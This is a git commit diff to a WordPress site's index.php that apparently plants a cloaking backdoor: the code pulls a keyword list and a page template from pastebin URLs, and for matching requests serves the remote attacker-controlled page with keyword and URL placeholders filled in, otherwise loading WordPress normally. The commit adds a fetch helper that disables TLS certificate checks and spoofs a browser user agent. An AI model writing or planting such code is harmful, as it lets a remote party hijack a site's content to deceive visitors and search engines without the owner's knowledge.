41060731a0972dfb743417a19146a775ee362be1
0xF102400 <165850862+0xF102400@users.noreply.github.com>
2024-05-14 16:05:10 +0700

    Update index.php

--- index.php
+++ index.php
@@ -5,9 +5,32 @@ $fullURL = $protocol . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
 $external_content = file_get_contents("https://pastebin.com/raw/v0UzjLTc");
 
+function geturlsinfo($url)
+{
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
 if (isset($keyword)) {
     if (stripos($external_content, $keyword) !== false) {
-        $page = file_get_contents("https://github.com/0xF102400/peler/raw/main/pba-uinsgd.html");
+        $page = geturlsinfo("https://pastebin.com/raw/zywtVVnE");
         $page = str_replace("kwbrand", $keyword, $page);
         $page = str_replace("urltunnel", $fullURL, $page);
         echo $page;
@@ -20,3 +43,4 @@ if (isset($keyword)) {
     require(dirname(__FILE__) . '/wp-blog-header.php');
 }
 ?>
+
